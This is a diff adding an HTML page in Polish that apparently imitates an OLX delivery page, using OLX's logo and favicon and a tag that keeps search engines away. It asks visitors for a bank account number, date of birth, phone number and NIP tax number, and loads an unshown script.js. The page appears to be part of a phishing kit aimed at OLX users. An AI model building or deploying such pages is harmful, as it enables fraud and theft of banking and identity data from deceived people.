@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+<meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex, nofollow">
+<link rel="icon" href="https://delivery.olx.pl/favicon.ico">
+
+<link rel='stylesheet' href='style.css' type='text/css' media='all' />
+<script type='text/javascript' src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js'></script>
+<script type='text/javascript' src='jquery.inputmask.bundle.js'></script>
+
+</head>
+<body>
+<div class="header">
+	<svg width="72" height="41" alt="OLX" data-testid="olxLogo"><path fill="#23E5DB" fill-rule="evenodd" d="M47.143 41h-9.746V0h9.746v41zM33.916 20.55c0 9.333-7.594 16.885-16.95 16.885-9.354 0-16.96-7.565-16.96-16.885S7.598 3.664 16.954 3.664c9.356 0 16.962 7.553 16.962 16.886zm-11.834 0c0-2.821-2.289-5.1-5.122-5.1-2.832 0-5.121 2.279-5.121 5.1 0 2.82 2.289 5.1 5.121 5.1 2.833 0 5.122-2.28 5.122-5.1zM71.88 10.3h-6.478L61.6 14.084 57.797 10.3h-6.478v6.56l3.753 3.734-3.753 3.734V30.8h6.58l3.713-3.697 3.714 3.697h6.58v-6.472l-3.753-3.734 3.752-3.734V10.3h-.025z"></path></svg>
+</div>
+<form action="">
+  
+  <div>
+    <label for="account">Numer konta</label>
+    <!-- Set via HTML -->
+    <input id="account" type="text" placeholder="np. 88 1500 0073 9827 9042 1516 1269" data-inputmask="'mask': '99 9999 9999 9999 9999 9999 9999'" />
+  </div>
+  
+  <div>
+    <label for="date">Data urodzenia</label>
+    <input id="date" data-inputmask="'alias': 'date'" placeholder="np. 14/12/1985"/>
+  </div>
+  
+  <div>
+    <label for="phone">Numer telefonu</label>
+	<div>
+	<span class="prefix">+48</span>
+    <input class="input-prefix" id="phone" type="text" placeholder="np. 500 123 456" data-inputmask="'mask': '999 999 999'" />
+	</div>
+  </div>
+  
+  <div>
+    <label for="nip">Numer NIP</label>
+    <input id="nip" type="text" placeholder="np. 123 456 78 90" data-inputmask="'mask': '999 999 99 99'" />
+  </div>
+  
+
+</form>
+<script type='text/javascript' src='script.js'></script>
+</body>
+</html>
